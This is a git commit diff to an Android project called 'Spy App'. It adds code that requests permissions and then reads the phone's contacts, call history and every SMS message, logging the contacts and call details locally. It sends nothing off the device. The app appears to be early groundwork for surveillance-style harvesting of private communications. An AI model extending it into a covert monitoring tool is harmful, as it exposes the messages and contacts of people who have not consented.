c3db07bd4e0f2d774b02f72ca80f32624a5be597
AhmedFai <faizan.fz2085@gmail.com>
2018-08-29 17:54:17 +0530

    Spy App

--- app/src/main/java/kkactive_india/in/spyapp/MainActivity.java
+++ app/src/main/java/kkactive_india/in/spyapp/MainActivity.java
@@ -3,9 +3,14 @@ package kkactive_india.in.spyapp;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.Build;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.Telephony;
 import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
@@ -14,10 +19,15 @@ import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.TextView;
+import android.widget.Toast;
 
+import java.util.Date;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
+
+    TextView textView;
 
     @TargetApi(Build.VERSION_CODES.O)
     @RequiresApi(api = Build.VERSION_CODES.M)
@@ -25,6 +35,8 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        textView = (TextView)findViewById(R.id.textview);
 
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -59,5 +71,132 @@ public class MainActivity extends AppCompatActivity {
             Log.d("Test", " Number is  " + num);
         }
 
+
+        ActivityCompat.requestPermissions(MainActivity.this,
+                new String[]{Manifest.permission.READ_CONTACTS,Manifest.permission.WRITE_CONTACTS},
+                1);
+       // String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
+        StringBuffer sb = new StringBuffer();
+        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
+        sb.append("Contact Details :");
+        while (phones.moveToNext())
+        {
+            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();
+
+            Log.d("names",name);
+            Log.d("Phones", phoneNumber);
+            //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );
+
+            sb.append("\nPhone Number:--- " + phoneNumber + " \nCall Type:--- " + name);
+            sb.append("\n----------------------------------");
+
+
+        }
+        phones.close();
+       // textView.setText(sb);
+        //callLogs();
+
+        getAllSms();
+
+
+
     }
+
+    public void callLogs(){
+
+
+        ActivityCompat.requestPermissions(MainActivity.this,
+                new String[]{Manifest.permission.READ_CALL_LOG,Manifest.permission.WRITE_CALL_LOG},
+                2);
+        StringBuffer sb = new StringBuffer();
+        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
+        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
+        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+        sb.append("Call Details :");
+        while (managedCursor.moveToNext()) {
+
+            String pName = managedCursor.getString(name);
+            String phNumber = managedCursor.getString(number); // mobile number
+            String callType = managedCursor.getString(type); // call type
+            String callDate = managedCursor.getString(date); // call date
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString(duration);
+            String dir = null;
+
+           // Log.d("NameKyaHai",pName);
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
+            sb.append("\n----------------------------------");
+        }
+        managedCursor.close();
+       // textView.setText(sb);
+        Log.e("Agil value --- ", sb.toString());
+
+
+    }
+
+
+    public void getAllSms(){
+       // ContentResolver cr = context.getContentResolver();
+        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
+        int totalSMS = 0;
+        if (c != null) {
+            totalSMS = c.getCount();
+            if (c.moveToFirst()) {
+                for (int j = 0; j < totalSMS; j++) {
+                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                    Date dateFormat= new Date(Long.valueOf(smsDate));
+                    String type;
+                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
+                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
+                            type = "inbox";
+                            break;
+                        case Telephony.Sms.MESSAGE_TYPE_SENT:
+                            type = "sent";
+                            break;
+                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
+                            type = "outbox";
+                            break;
+                        default:
+                            break;
+                    }
+
+                   // Log.d("nnn",number);
+                   // Log.d("bbb",body);
+
+
+
+                    c.moveToNext();
+                }
+            }
+
+            c.close();
+
+        } else {
+            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+
 }
